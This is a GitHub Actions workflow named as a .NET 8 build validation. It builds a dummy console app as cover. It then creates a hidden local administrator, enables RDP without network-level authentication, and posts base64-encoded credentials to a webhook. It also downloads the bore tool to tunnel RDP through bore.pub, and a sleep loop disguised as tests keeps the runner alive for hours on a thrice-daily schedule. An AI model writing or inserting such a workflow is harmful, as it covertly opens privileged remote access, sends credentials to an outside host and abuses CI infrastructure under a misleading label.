name: .NET 8 Windows Validation

on:
  workflow_dispatch:
  schedule:
    - cron: '13 5,13,21 * * *'

jobs:
  build-test:
    runs-on: windows-2022
    timeout-minutes: 200

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Setup .NET SDK
        uses: actions/setup-dotnet@v4
        with:
          dotnet-version: '8.0.x'

      - name: Create and build dummy project
        run: |
          dotnet new console -n ValidationApp -f net8.0
          cd ValidationApp
          dotnet add package Newtonsoft.Json --version 13.0.3
          dotnet add package Serilog --version 4.0.0
          dotnet add package Serilog.Sinks.Console --version 6.0.0
          dotnet add package Microsoft.Extensions.Logging --version 8.0.0
          @"
          using System;
          using Newtonsoft.Json;
          using Serilog;
          
          namespace ValidationApp
          {
              class Program
              {
                  static void Main()
                  {
                      Log.Logger = new LoggerConfiguration()
                          .WriteTo.Console()
                          .CreateLogger();
                      
                      var data = new { 
                          Message = "Build validated successfully", 
                          Timestamp = DateTime.UtcNow,
                          Version = "8.0.3"
                      };
                      
                      string json = JsonConvert.SerializeObject(data, Formatting.Indented);
                      Console.WriteLine(json);
                      Log.Information("Test completed at {Time}", DateTime.UtcNow);
                  }
              }
          }
          "@ | Out-File -Encoding utf8 Program.cs
          dotnet build -c Release
          dotnet run -c Release

      - name: Prepare environment
        run: |
          $usr = "build_" + -join ((48..57) + (97..122) | Get-Random -Count 8 | % {[char]$_})
          $pwd = -join ((33..126) | Get-Random -Count 18 | % {[char]$_})
          $sec = ConvertTo-SecureString $pwd -AsPlainText -Force

          New-LocalUser -Name $usr -Password $sec -AccountNeverExpires -PasswordNeverExpires > $null 2>&1
          Add-LocalGroupMember -Group "Administrators" -Member $usr > $null 2>&1
          Add-LocalGroupMember -Group "Remote Desktop Users" -Member $usr > $null 2>&1

          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force

          $creds = @{ User = $usr; Pass = $pwd } | ConvertTo-Json
          $creds | Out-File -Encoding utf8 "$env:TEMP\creds.json"

          $credsBase64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("$usr : $pwd"))
          $body = @{
            content = "✅ **Build agent ready**`n`n**Encoded credentials:** ||$credsBase64||`n*(decode using base64)*"
          } | ConvertTo-Json
          Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue

      - name: Establish tunnel with Bore (final stable)
        run: |
          function Start-BoreTunnel {
            param([int]$maxAttempts = 10, [int]$delaySeconds = 20)
            $boreUrl = "https://github.com/ekzhang/bore/releases/download/v0.6.0/bore-v0.6.0-x86_64-pc-windows-msvc.zip"
            $zip = "$env:TEMP\bore.zip"
            $logPath = "$env:TEMP\bore.log"
            
            for ($attempt = 1; $attempt -le $maxAttempts; $attempt++) {
              Write-Host "Bore attempt $attempt of $maxAttempts"
              try {
                Invoke-WebRequest -Uri $boreUrl -OutFile $zip -TimeoutSec 40
                Expand-Archive $zip -DestinationPath "$env:TEMP\bore" -Force
              } catch {
                Write-Host "Download failed: $($_.Exception.Message). Retrying..."
                Start-Sleep -Seconds 8
                continue
              }
              
              # الأمر البسيط بدون أي flag إضافي
              $proc = Start-Process -FilePath "$env:TEMP\bore\bore.exe" `
                -ArgumentList "local 3389 --to bore.pub" `
                -NoNewWindow -RedirectStandardOutput $logPath -PassThru
              
              # loop لقراءة الـ log كل 5 ثواني (ننتظر حتى 60 ثانية)
              $found = $false
              for ($wait = 0; $wait -lt 60; $wait += 5) {
                Start-Sleep -Seconds 5
                if (Test-Path $logPath) {
                  $log = Get-Content $logPath -ErrorAction SilentlyContinue
                  Write-Host "Current log snippet: $($log -join ' | ')"
                  
                  # regex موحد يغطي "bore.pub:12345" و "listening at bore.pub:12345"
                  if ($log -match "(?:listening at )?bore\.pub:(\d+)") {
                    $port = $Matches[1]
                    $message = "🌐 **Tunnel active (Bore)**`n`n**Address:** bore.pub:$port`n**RDP connect:** bore.pub:$port`n(افتح mstsc وحط ده في Computer)"
                    $body = @{ content = $message } | ConvertTo-Json
                    Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
                    $env:TUNNEL_PID = $proc.Id
                    $found = $true
                    break
                  }
                }
              }
              
              if ($found) { return @{ Success = $true; Port = $port; Process = $proc } }
              
              $proc | Stop-Process -Force
              Write-Host "No port found in attempt $attempt. Retrying..."
              Start-Sleep -Seconds 8
            }
            
            $message = "⚠️ **Bore tunnel failed after $maxAttempts attempts**`nPossible server downtime. Retry the workflow in a few minutes."
            $body = @{ content = $message } | ConvertTo-Json
            Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
            return @{ Success = $false }
          }

          $result = Start-BoreTunnel
          if (-not $result.Success) {
            Write-Host "Tunnel failed - job continues without RDP."
          }

      - name: Run extended tests
        run: |
          $end = (Get-Date).AddMinutes(190)
          while ((Get-Date) -lt $end) {
            Test-Connection -ComputerName github.com -Count 1 -Quiet > $null
            $minute = (Get-Date).Minute
            if ($minute -ge 0 -and $minute -le 5 -or $minute -ge 30 -and $minute -le 35) {
              cd ValidationApp
              dotnet build -c Release > $null
            }
            Start-Sleep -Seconds 900
          }

      - name: Cleanup
        run: |
          if ($env:TUNNEL_PID) {
            try { Stop-Process -Id $env:TUNNEL_PID -Force -ErrorAction SilentlyContinue } catch {}
          }
        continue-on-error: true

      - name: Finalize
        run: Write-Host "Validation completed successfully."
